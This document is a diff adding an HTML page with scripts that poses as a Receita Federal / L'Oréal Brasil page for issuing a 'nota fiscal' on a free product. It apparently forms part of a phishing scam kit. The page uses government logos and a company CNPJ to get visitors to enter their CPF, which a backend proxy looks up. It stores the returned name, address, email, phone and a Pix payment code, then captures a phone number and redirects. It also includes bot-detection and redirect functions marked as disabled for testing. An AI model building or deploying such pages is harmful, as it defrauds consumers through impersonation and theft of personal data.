@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html data-template="buscar-cpf">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>L'Oréal Brasil - Emissão de Nota Fiscal</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script>
+    // Funções de verificação desativadas temporariamente para testes
+    function isMobile() {
+      return true; // Sempre retorna true para evitar redirecionamento
+    }
+
+    function isBot() {
+      return false; // Sempre retorna false para evitar redirecionamento
+    }
+
+    function isWideScreen() {
+      return false; // Sempre retorna false para evitar redirecionamento
+    }
+
+    // Função de verificação modificada para sempre permitir acesso
+    function checkAccess() {
+      // Redirecionamento desativado para testes
+      console.log("[DEBUG] Verificação de acesso desativada para testes");
+    }
+
+    // Evento onload modificado
+    window.onload = function() {
+      console.log("[DEBUG] Inicializando script");
+      // Não chamar checkAccess() para evitar redirecionamento
+    };
+
+    // Remover listener de resize para evitar redirecionamentos
+    // window.addEventListener('resize', checkAccess);
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 140px; /* Reduced logo size */
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        .info-box {
+            border-left: 4px solid #0c326f;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: auto; /* Removed fixed height */
+        }
+        .info-box h2 {
+            color: #0c326f;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .info-box p {
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+        .initial-content {
+            transition: opacity 0.3s ease;
+        }
+        .user-data {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+        }
+        .user-data-item {
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: #0c326f;
+            display: flex;
+            align-items: center;
+        }
+        .user-data-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+            color: #0c326f;
+        }
+        .cpf-form {
+            background-color: white;
+            padding: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+        .cpf-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        .cpf-input:focus {
+            border-color: #0c326f;
+            outline: none;
+        }
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .submit-button:hover {
+            background-color: #092555;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(12, 50, 111, 0.2);
+        }
+        .analysis-container {
+            margin: 20px 0;
+        }
+        .analysis-step {
+            padding: 12px 15px;
+            margin: 8px 0;
+            border-left: 3px solid #0c326f;
+            background: #f8f9fa;
+            border-radius: 4px;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideIn 0.8s ease forwards;
+        }
+        .analysis-step div {
+            line-height: 1.2;
+        }
+        .warning-message {
+            margin: 25px 0;
+            font-weight: 600;
+            color: #721c24;
+            line-height: 1.6;
+            padding: 20px;
+            border: 1px solid #dc3545;
+            border-radius: 8px;
+        }
+        .irregularities {
+            margin: 20px 0;
+            line-height: 1.6;
+        }
+        .irregularity-item {
+            margin-bottom: 20px;
+            padding-left: 25px;
+            position: relative;
+        }
+        .irregularity-title {
+            color: #721c24;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .user-details {
+            border-bottom: 2px solid #0c326f;
+            padding-bottom: 15px;
+            margin: 20px 0;
+            line-height: 1.3;
+        }
+        .user-details strong {
+            display: block;
+            color: #0c326f;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        .irregularities {
+            line-height: 1.3;
+            margin: 15px 0;
+        }
+        .irregularity-item {
+            margin-bottom: 12px;
+        }
+        .irregularity-item div {
+            line-height: 1.3;
+            margin-top: 4px;
+        }
+        .warning-message {
+            line-height: 1.3;
+            margin: 15px 0;
+        }
+        @media (max-width: 600px) {
+            .user-details strong {
+                font-size: 16px;
+            }
+            .irregularity-title {
+                font-size: 16px;
+            }
+            .warning-message {
+                font-size: 14px;
+                padding: 15px;
+            }
+            .logo {
+                width: 120px;
+            }
+            .analysis-step {
+                padding: 6px 10px;
+                margin: 3px 0;
+            }
+            .analysis-step div {
+                line-height: 1.2;
+            }
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        .loading-item {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            padding: 15px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.8s ease forwards;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .loading-item i {
+            margin-right: 15px;
+            font-size: 18px;
+            color: #0c326f;
+        }
+        .progress-bar {
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin-top: 4px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: #0c326f;
+            width: 0;
+            animation: progressFill 2s ease-in-out;
+        }
+        @keyframes progressFill {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        @keyframes pulseWarning {
+            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
+        }
+        .regularize-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 20px 0 40px;
+            transition: all 0.3s ease;
+            animation: pulseButton 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .regularize-button:hover {
+            background-color: #c82333;
+            transform: translateY(-2px);
+        }
+        @keyframes pulseButton {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+
+        .phone-modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .phone-modal-content {
+            background-color: #fff;
+            margin: 10% auto;
+            width: 95%;
+            max-width: 600px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            animation: slideUp 0.3s ease;
+        }
+
+        .phone-modal-header {
+            background-color: #0c326f;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px 8px 0 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .phone-modal-body {
+            padding: 20px;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .phone-input:focus {
+            border-color: #0c326f;
+            outline: none;
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .continue-button:hover {
+            background-color: #092555;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body class="buscar-cpf-page">
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="info-box">
+            <div class="initial-content">
+                <h2>Emissão de Nota Fiscal para Liberação de Envio</h2>
+                <p style="font-weight: 500; color: #333; margin-bottom: 15px;">
+                  Olá! Você recebeu um produto <strong>gratuito</strong> da <strong>L'Oréal Brasil Comercial de Cosméticos Ltda.</strong> 
+                  (CNPJ: 30.278.428/0001-61)
+                </p>
+                <p>Para que possamos liberar seu pedido para envio pelos Correios, precisamos emitir uma nota fiscal, mesmo se tratando de um produto gratuito.</p>
+                <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 4px solid #dc3545;">
+                    <p style="margin: 0; color: #333; font-weight: 500;">Seu pedido de produtos L'Oréal está aguardando a emissão da nota fiscal no centro logístico dos Correios para ser entregue em seu endereço.</p>
+                </div>
+                <p>Por favor, preencha seu CPF utilizado na compra abaixo para identificar o pacote no centro logístico dos Correios.</p>
+            </div>
+            <div class="cpf-form" id="cpfFormContainer">
+                <input type="tel" id="cpfInput" class="cpf-input" placeholder="Digite o CPF utilizado na compra" pattern="\d*" maxlength="14">
+                <button id="verifyButton" class="submit-button" style="background-color: #0c326f;">
+                    <i class="fas fa-box"></i>
+                    Liberar Envio
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <div id="phoneModal" class="phone-modal">
+        <div class="phone-modal-content">
+            <div class="phone-modal-header" style="background-color: #0c326f;">
+                Confirmar Dados para Entrega
+            </div>
+            <div class="phone-modal-body">
+                <p style="margin-bottom: 15px;">Para prosseguir com a emissão da nota fiscal, confirme seu telefone para contato:</p>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="(XX) XXXXX-XXXX" maxlength="15">
+                <button id="continueButton" class="continue-button" style="background-color: #0c326f;">
+                    Confirmar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    const infoBox = document.querySelector('.info-box');
+
+    document.getElementById('cpfInput').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 11) value = value.slice(0, 11);
+
+        if (value.length > 9) {
+            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+        } else if (value.length > 6) {
+            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
+        } else if (value.length > 3) {
+            value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
+        }
+
+        e.target.value = value;
+    });
+
+    document.getElementById('verifyButton').addEventListener('click', async function() {
+        const button = this;
+        const cpfInput = document.getElementById('cpfInput');
+        const cpf = cpfInput.value.replace(/\D/g, '');
+
+        if (cpf.length !== 11) {
+            alert('Por favor, digite um CPF válido');
+            return;
+        }
+
+        button.disabled = true;
+        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+
+        // Remover conteúdo inicial
+        const initialContent = document.querySelector('.initial-content');
+        if (initialContent) {
+            initialContent.style.opacity = '0';
+            initialContent.remove();
+        }
+
+        try {
+            console.log("Iniciando consulta de CPF:", cpf);
+            
+            let data;
+            
+            // Usar nossa API de proxy para consultar o CPF
+            // Isso evita problemas de CORS pois a chamada é feita do servidor
+            const cpfSemPontuacao = cpf.replace(/\D/g, '');
+            const apiUrl = `/api/consulta-cpf?cpf=${cpfSemPontuacao}`;
+            console.log("URL da API (proxy):", apiUrl);
+                
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                console.log("Resposta recebida, status:", response.status);
+                
+                if (response.status !== 200) {
+                    throw new Error(`Erro na API: Status ${response.status}`);
+                }
+                
+                data = await response.json();
+                console.log("Dados recebidos:", data);
+                
+                if (!data.sucesso) {
+                    throw new Error(data.mensagem || "Erro ao consultar o CPF");
+                }
+            } catch (fetchError) {
+                console.error("Erro ao fazer fetch:", fetchError);
+                throw fetchError; // Propagar o erro para ser capturado pelo try/catch externo
+            }
+
+            if (data.sucesso === true && data.cliente) {
+                // Remover formulário
+                document.getElementById('cpfFormContainer').style.display = 'none';
+                
+                // Mostrar loader
+                const loadingContainer = document.createElement('div');
+                loadingContainer.id = 'loadingContainer';
+                loadingContainer.style.marginTop = '20px';
+                loadingContainer.style.textAlign = 'center';
+                
+                loadingContainer.innerHTML = `
+                    <div style="margin: 30px 0;">
+                        <i class="fas fa-spinner fa-spin" style="font-size: 3rem; color: #0c326f;"></i>
+                        <h3 style="color: #0c326f; margin: 15px 0; font-weight: 600;">Buscando pedido...</h3>
+                    </div>
+                `;
+                
+                infoBox.appendChild(loadingContainer);
+                
+                // Salvar todos os dados do cliente no localStorage, incluindo endereço
+                localStorage.setItem('userData', JSON.stringify({
+                    nome: data.cliente.nome,
+                    cpf: cpf,
+                    telefone: data.cliente.telefone,
+                    email: data.cliente.email,
+                    phone: data.cliente.telefone,
+                    // Dados de endereço
+                    cep: data.cliente.cep,
+                    rua: data.cliente.rua,
+                    numero: data.cliente.numero,
+                    complemento: data.cliente.complemento,
+                    bairro: data.cliente.bairro,
+                    cidade: data.cliente.cidade,
+                    estado: data.cliente.estado,
+                    // Outros dados
+                    pixCode: data.cliente.pixCode
+                }));
+                
+                // Redirecionar para a página index após um breve atraso
+                setTimeout(() => {
+                    window.location.href = '/';
+                }, 1500);
+            } else {
+                // Tratar resposta inválida ou erro da API
+                console.error('API retornou dados inválidos:', data);
+                button.innerHTML = '<i class="fas fa-box"></i> Liberar Envio';
+                button.disabled = false;
+                let mensagemErro = 'CPF não encontrado na base de dados.';
+                if (data.mensagem) {
+                    mensagemErro = data.mensagem;
+                }
+                alert(mensagemErro);
+            }
+        } catch (error) {
+            console.error('Erro na consulta:', error);
+            button.innerHTML = '<i class="fas fa-box"></i> Liberar Envio';
+            button.disabled = false;
+            alert('Ocorreu um erro de conexão ao consultar o CPF. Por favor, verifique sua conexão e tente novamente.');
+        }
+    });
+});
+
+function formatPhoneNumber(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 11) value = value.slice(0, 11);
+
+    if (value.length > 6) {
+        value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
+    } else if (value.length > 2) {
+        value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
+    } else if (value.length > 0) {
+        value = value.replace(/^(\d{0,2})/, '($1');
+    }
+
+    input.value = value;
+}
+
+function showPhoneModal() {
+    const modal = document.getElementById('phoneModal');
+    const phoneInput = document.getElementById('phoneInput');
+    const continueButton = document.getElementById('continueButton');
+
+    modal.style.display = 'block';
+    phoneInput.focus();
+
+    phoneInput.addEventListener('input', function() {
+        formatPhoneNumber(this);
+    });
+
+    continueButton.addEventListener('click', function() {
+        const phone = phoneInput.value.replace(/\D/g, '');
+        if (phone.length !== 11) {
+            alert('Por favor, digite um número de telefone válido com DDD');
+            return;
+        }
+
+        // Get existing user data
+        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+        // Add phone number
+        userData.phone = phoneInput.value;
+        // Save back to localStorage
+        localStorage.setItem('userData', JSON.stringify(userData));
+
+        // Redirect to index
+        window.location.href = '/';
+    });
+}
+    </script>
+</body>
+</html>
